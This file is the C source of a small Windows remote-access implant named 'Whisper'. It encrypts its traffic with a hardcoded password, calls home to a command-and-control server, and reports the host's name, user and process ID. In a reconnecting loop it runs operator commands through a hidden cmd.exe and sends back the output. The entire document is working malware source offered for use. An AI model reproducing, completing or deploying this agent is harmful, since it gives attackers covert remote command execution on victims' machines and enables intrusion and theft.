/**
 * Whisper C Stub — Minimal agent under 50KB with full crypto
 * Compile (MSVC): cl /O1 /GS- stub_c.c /link ws2_32.lib bcrypt.lib advapi32.lib
 * Compile (MinGW): gcc -Os -s -o stub.exe stub_c.c -lws2_32 -lbcrypt -ladvapi32
 *
 * Full encryption protocol compatible with whisper Python agent:
 *   PBKDF2-HMAC-SHA256 key derivation (100k iterations)
 *   HMAC-SHA256 stream cipher (IV + keystream XOR)
 *   HMAC integrity tag on every message
 *   Length-prefixed + base64-encoded framing
 */

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")

#define C2_HOST "127.0.0.1"
#define C2_PORT 4443
#define C2_PASS "whisper_secret_key"
#define RECONNECT_DELAY 10000
#define KEY_LEN 32
#define IV_LEN 16
#define TAG_LEN 16
#define SALT "whisper_salt_2024"
#define SALT_LEN 17
#define PBKDF2_ITER 100000
#define MAX_MSG 262144

static BCRYPT_ALG_HANDLE hMacAlg = NULL;
static BCRYPT_ALG_HANDLE hSha256Alg = NULL;

int crypto_init(void) {
    if (BCryptOpenAlgorithmProvider(&hMacAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG) != 0)
        return 0;
    if (BCryptOpenAlgorithmProvider(&hSha256Alg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0)
        return 0;
    return 1;
}

void crypto_cleanup(void) {
    if (hMacAlg) BCryptCloseAlgorithmProvider(hMacAlg, 0);
    if (hSha256Alg) BCryptCloseAlgorithmProvider(hSha256Alg, 0);
}

int hmac_sha256(const BYTE *key, DWORD key_len, const BYTE *data, DWORD data_len, BYTE *mac_out) {
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD result = 0, hash_len = 0, cb = 0;
    if (BCryptCreateHash(hMacAlg, &hHash, NULL, 0, (PUCHAR)key, key_len, 0) != 0) return 0;
    if (BCryptHashData(hHash, (PUCHAR)data, data_len, 0) != 0) { BCryptDestroyHash(hHash); return 0; }
    BCryptGetProperty(hHash, BCRYPT_HASH_LENGTH, (PUCHAR)&hash_len, sizeof(hash_len), &cb, 0);
    if (BCryptFinishHash(hHash, mac_out, hash_len, 0) != 0) { BCryptDestroyHash(hHash); return 0; }
    BCryptDestroyHash(hHash);
    return 1;
}

int derive_key(const char *password, BYTE *key_out) {
    DWORD pass_len = (DWORD)strlen(password);
    BYTE *salt = (BYTE*)SALT;
    return BCryptDeriveKeyPBKDF2(hMacAlg, (PUCHAR)password, pass_len, NULL,
        salt, SALT_LEN, PBKDF2_ITER, key_out, KEY_LEN, 0) == 0;
}

/* Simple base64 encoder */
void b64encode(const BYTE *in, DWORD in_len, char *out, DWORD *out_len) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    DWORD i, o = 0;
    for (i = 0; i < in_len; i += 3) {
        DWORD val = (DWORD)in[i] << 16;
        if (i + 1 < in_len) val |= (DWORD)in[i+1] << 8;
        if (i + 2 < in_len) val |= (DWORD)in[i+2];
        out[o++] = b64[(val >> 18) & 0x3F];
        out[o++] = b64[(val >> 12) & 0x3F];
        out[o++] = (i + 1 < in_len) ? b64[(val >> 6) & 0x3F] : '=';
        out[o++] = (i + 2 < in_len) ? b64[val & 0x3F] : '=';
    }
    out[o] = 0;
    if (out_len) *out_len = o;
}

int b64decode(const char *in, DWORD in_len, BYTE *out, DWORD *out_len) {
    static const unsigned char b64dec[256] = {
        0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
        0,0,0,0,0,0,0,0,0,0,0,62,0,0,0,63, 52,53,54,55,56,57,58,59,60,61,0,0,0,0,0,0,
        0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14, 15,16,17,18,19,20,21,22,23,24,25,0,0,0,0,0,
        0,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40, 41,42,43,44,45,46,47,48,49,50,51,0,0,0,0,0
    };
    DWORD o = 0;
    for (DWORD i = 0; i < in_len && in[i] != '='; i += 4) {
        if (i + 3 >= in_len) return 0;
        BYTE b0 = b64dec[(unsigned char)in[i]];
        BYTE b1 = b64dec[(unsigned char)in[i+1]];
        BYTE b2 = b64dec[(unsigned char)in[i+2]];
        BYTE b3 = b64dec[(unsigned char)in[i+3]];
        out[o++] = (b0 << 2) | (b1 >> 4);
        if (in[i+2] != '=') out[o++] = (b1 << 4) | (b2 >> 2);
        if (in[i+3] != '=') out[o++] = (b2 << 6) | b3;
    }
    if (out_len) *out_len = o;
    return 1;
}

/* Encrypt plaintext: returns base64(IV + tag + ct) as malloc'd string */
char *encrypt_message(const BYTE *key, const char *plain, int plain_len) {
    BYTE iv[IV_LEN];
    BYTE tag[TAG_LEN];
    BYTE *keystream = NULL;
    char *result = NULL;

    /* Generate random IV */
    for (int i = 0; i < IV_LEN; i++) iv[i] = (BYTE)(rand() ^ (rand() << 8));

    /* Generate keystream: HMAC-SHA256(key, IV || counter) for each block */
    int ks_len = plain_len;
    keystream = (BYTE*)malloc(ks_len);
    if (!keystream) return NULL;

    BYTE ctr_buf[8];
    DWORD pos = 0, ctr = 0;
    BYTE hmac_out[32];
    while (pos < ks_len) {
        memset(ctr_buf, 0, 8);
        ctr_buf[4] = (BYTE)((ctr >> 24) & 0xFF);
        ctr_buf[5] = (BYTE)((ctr >> 16) & 0xFF);
        ctr_buf[6] = (BYTE)((ctr >> 8) & 0xFF);
        ctr_buf[7] = (BYTE)(ctr & 0xFF);
        /* Build buffer: IV || ctr_buf */
        BYTE buf[IV_LEN + 8];
        memcpy(buf, iv, IV_LEN);
        memcpy(buf + IV_LEN, ctr_buf, 8);
        if (!hmac_sha256(key, KEY_LEN, buf, IV_LEN + 8, hmac_out)) goto cleanup;
        DWORD copy_len = (ks_len - pos < 32) ? ks_len - pos : 32;
        memcpy(keystream + pos, hmac_out, copy_len);
        pos += copy_len;
        ctr++;
    }

    /* XOR plaintext with keystream */
    BYTE *ct = (BYTE*)malloc(plain_len);
    if (!ct) goto cleanup;
    for (int i = 0; i < plain_len; i++) ct[i] = plain[i] ^ keystream[i];

    /* Tag: HMAC-SHA256(key, IV || ct) first 16 bytes */
    BYTE *tag_input = (BYTE*)malloc(IV_LEN + plain_len);
    if (!tag_input) { free(ct); goto cleanup; }
    memcpy(tag_input, iv, IV_LEN);
    memcpy(tag_input + IV_LEN, ct, plain_len);
    if (!hmac_sha256(key, KEY_LEN, tag_input, IV_LEN + plain_len, hmac_out)) { free(ct); free(tag_input); goto cleanup; }
    memcpy(tag, hmac_out, TAG_LEN);
    free(tag_input);

    /* Assemble: IV + tag + ct */
    BYTE *packet = (BYTE*)malloc(IV_LEN + TAG_LEN + plain_len);
    if (!packet) { free(ct); goto cleanup; }
    memcpy(packet, iv, IV_LEN);
    memcpy(packet + IV_LEN, tag, TAG_LEN);
    memcpy(packet + IV_LEN + TAG_LEN, ct, plain_len);
    free(ct);

    /* Base64 encode */
    DWORD b64_len = 0;
    b64encode(packet, IV_LEN + TAG_LEN + plain_len, NULL, &b64_len);
    result = (char*)malloc(b64_len + 1);
    if (result) b64encode(packet, IV_LEN + TAG_LEN + plain_len, result, &b64_len);
    free(packet);

cleanup:
    if (keystream) free(keystream);
    return result;
}

/* Decrypt: input is base64(IV + tag + ct), returns malloc'd plaintext */
char *decrypt_message(const BYTE *key, const char *b64_input, DWORD b64_len, int *plain_len_out) {
    BYTE *decoded = (BYTE*)malloc(b64_len);
    DWORD dec_len = 0;
    if (!decoded || !b64decode(b64_input, b64_len, decoded, &dec_len)) { free(decoded); return NULL; }
    if (dec_len < IV_LEN + TAG_LEN) { free(decoded); return NULL; }

    BYTE *iv = decoded;
    BYTE *tag = decoded + IV_LEN;
    BYTE *ct = decoded + IV_LEN + TAG_LEN;
    int ct_len = dec_len - IV_LEN - TAG_LEN;

    /* Verify tag */
    BYTE *tag_input = (BYTE*)malloc(IV_LEN + ct_len);
    if (!tag_input) { free(decoded); return NULL; }
    memcpy(tag_input, iv, IV_LEN);
    memcpy(tag_input + IV_LEN, ct, ct_len);
    BYTE hmac_out[32];
    if (!hmac_sha256(key, KEY_LEN, tag_input, IV_LEN + ct_len, hmac_out)) { free(tag_input); free(decoded); return NULL; }
    free(tag_input);
    if (memcmp(tag, hmac_out, TAG_LEN) != 0) { free(decoded); return NULL; }

    /* Generate keystream */
    BYTE *keystream = (BYTE*)malloc(ct_len);
    if (!keystream) { free(decoded); return NULL; }
    DWORD pos = 0, ctr = 0;
    while (pos < ct_len) {
        BYTE ctr_buf[8];
        memset(ctr_buf, 0, 8);
        ctr_buf[4] = (BYTE)((ctr >> 24) & 0xFF);
        ctr_buf[5] = (BYTE)((ctr >> 16) & 0xFF);
        ctr_buf[6] = (BYTE)((ctr >> 8) & 0xFF);
        ctr_buf[7] = (BYTE)(ctr & 0xFF);
        BYTE buf[IV_LEN + 8];
        memcpy(buf, iv, IV_LEN);
        memcpy(buf + IV_LEN, ctr_buf, 8);
        if (!hmac_sha256(key, KEY_LEN, buf, IV_LEN + 8, hmac_out)) { free(keystream); free(decoded); return NULL; }
        DWORD copy_len = (ct_len - pos < 32) ? ct_len - pos : 32;
        memcpy(keystream + pos, hmac_out, copy_len);
        pos += copy_len;
        ctr++;
    }

    /* XOR */
    BYTE *plain = (BYTE*)malloc(ct_len + 1);
    if (!plain) { free(keystream); free(decoded); return NULL; }
    for (int i = 0; i < ct_len; i++) plain[i] = ct[i] ^ keystream[i];
    plain[ct_len] = 0;

    free(keystream);
    free(decoded);
    if (plain_len_out) *plain_len_out = ct_len;
    return (char*)plain;
}

/* --- Network I/O with encryption --- */

SOCKET connect_c2(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return INVALID_SOCKET;
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return s;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    addr.sin_addr.s_addr = inet_addr(C2_HOST);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s); return INVALID_SOCKET;
    }
    return s;
}

int recv_all(SOCKET s, char *buf, int len) {
    int total = 0;
    while (total < len) {
        int n = recv(s, buf + total, len - total, 0);
        if (n <= 0) return 0;
        total += n;
    }
    return 1;
}

int send_all(SOCKET s, const char *buf, int len) {
    int total = 0;
    while (total < len) {
        int n = send(s, buf + total, len - total, 0);
        if (n <= 0) return 0;
        total += n;
    }
    return 1;
}

/* Send encrypted JSON message */
int send_encrypted(SOCKET s, const BYTE *key, const char *json) {
    char *b64 = encrypt_message(key, json, (int)strlen(json));
    if (!b64) return 0;
    int b64len = (int)strlen(b64);
    if (b64len > MAX_MSG) { free(b64); return 0; }
    char hdr[4];
    hdr[0] = (BYTE)((b64len >> 24) & 0xFF);
    hdr[1] = (BYTE)((b64len >> 16) & 0xFF);
    hdr[2] = (BYTE)((b64len >> 8) & 0xFF);
    hdr[3] = (BYTE)(b64len & 0xFF);
    int ok = send_all(s, hdr, 4) && send_all(s, b64, b64len);
    free(b64);
    return ok;
}

/* Receive and decrypt message - returns malloc'd string */
char *recv_encrypted(SOCKET s, const BYTE *key) {
    char lenbuf[4];
    if (!recv_all(s, lenbuf, 4)) return NULL;
    int msglen = (lenbuf[0] << 24) | (lenbuf[1] << 16) | (lenbuf[2] << 8) | (lenbuf[3] & 0xFF);
    if (msglen < 1 || msglen > MAX_MSG) return NULL;
    char *b64 = (char*)malloc(msglen + 1);
    if (!b64) return NULL;
    if (!recv_all(s, b64, msglen)) { free(b64); return NULL; }
    b64[msglen] = 0;
    int plain_len = 0;
    char *plain = decrypt_message(key, b64, msglen, &plain_len);
    free(b64);
    return plain;
}

/* Extract string value from simple JSON key:value pair */
char *extract_json_str(const char *json, const char *key) {
    char search[128];
    snprintf(search, sizeof(search), "\"%s\":\"", key);
    char *start = strstr(json, search);
    if (!start) return NULL;
    start += strlen(search);
    char *end = strchr(start, '"');
    if (!end) return NULL;
    int len = (int)(end - start);
    char *val = (char*)malloc(len + 1);
    if (!val) return NULL;
    memcpy(val, start, len);
    val[len] = 0;
    return val;
}

void exec_cmd(const char *cmd, char *out, int outlen) {
    HANDLE rpipe_w, rpipe_r;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    if (!CreatePipe(&rpipe_r, &rpipe_w, &sa, 0)) { strcpy(out, "(pipe failed)"); return; }
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = rpipe_w;
    si.hStdError = rpipe_w;
    PROCESS_INFORMATION pi;
    char cmdbuf[4096];
    snprintf(cmdbuf, sizeof(cmdbuf), "cmd.exe /c %s", cmd);
    if (CreateProcessA(NULL, cmdbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(rpipe_w);
    DWORD read = 0;
    ReadFile(rpipe_r, out, outlen - 1, &read, NULL);
    out[read] = 0;
    CloseHandle(rpipe_r);
    if (read == 0) strcpy(out, "(no output)");
}

int main(void) {
    BYTE key[KEY_LEN];
    if (!crypto_init()) return 1;
    if (!derive_key(C2_PASS, key)) { crypto_cleanup(); return 1; }

    while (1) {
        SOCKET s = connect_c2();
        if (s == INVALID_SOCKET) { Sleep(RECONNECT_DELAY); continue; }

        /* Send init message (encrypted) */
        char computer[64], username[64];
        DWORD comp_size = sizeof(computer), user_size = sizeof(username);
        GetComputerNameA(computer, &comp_size);
        GetUserNameA(username, &user_size);
        char init_json[512];
        snprintf(init_json, sizeof(init_json),
            "{\"type\":\"init\",\"os\":\"Windows\",\"hostname\":\"%s\",\"user\":\"%s\",\"arch\":\"%s\",\"pid\":%d}",
            computer, username,
#ifdef _WIN64
            "AMD64"
#else
            "x86"
#endif
            , GetCurrentProcessId());
        if (!send_encrypted(s, key, init_json)) { closesocket(s); Sleep(RECONNECT_DELAY); continue; }

        /* Command loop */
        while (1) {
            char *msg = recv_encrypted(s, key);
            if (!msg) break;

            if (strstr(msg, "\"type\":\"exit\"")) {
                free(msg); break;
            }
            if (strstr(msg, "\"type\":\"ping\"")) {
                free(msg); continue;
            }
            if (strstr(msg, "\"type\":\"shell\"") || strstr(msg, "\"type\":\"cmd\"")) {
                char *cmd = extract_json_str(msg, "cmd");
                free(msg);
                if (cmd) {
                    char output[8192];
                    exec_cmd(cmd, output, sizeof(output));
                    /* Build response JSON */
                    char resp[8192 + 128];
                    /* Escape special chars in output */
                    char escaped[8192];
                    int ei = 0;
                    for (int i = 0; output[i] && ei < (int)sizeof(escaped) - 4; i++) {
                        if (output[i] == '"' || output[i] == '\\') {
                            if (ei < (int)sizeof(escaped) - 2) { escaped[ei++] = '\\'; escaped[ei++] = output[i]; }
                        } else if (output[i] == '\n') {
                            if (ei < (int)sizeof(escaped) - 2) { escaped[ei++] = '\\'; escaped[ei++] = 'n'; }
                        } else if (output[i] == '\r') {
                            if (ei < (int)sizeof(escaped) - 2) { escaped[ei++] = '\\'; escaped[ei++] = 'r'; }
                        } else if (output[i] == '\t') {
                            if (ei < (int)sizeof(escaped) - 2) { escaped[ei++] = '\\'; escaped[ei++] = 't'; }
                        } else {
                            escaped[ei++] = output[i];
                        }
                    }
                    escaped[ei] = 0;
                    snprintf(resp, sizeof(resp), "{\"type\":\"response\",\"output\":\"%s\"}", escaped);
                    send_encrypted(s, key, resp);
                    free(cmd);
                }
            } else {
                /* Unknown command: send error */
                char err[256];
                char *type = extract_json_str(msg, "type");
                snprintf(err, sizeof(err), "{\"type\":\"response\",\"error\":\"Unknown type: %s\"}", type ? type : "?");
                if (type) free(type);
                send_encrypted(s, key, err);
                free(msg);
            }
        }
        closesocket(s);
        Sleep(RECONNECT_DELAY);
    }
    crypto_cleanup();
    WSACleanup();
    return 0;
}
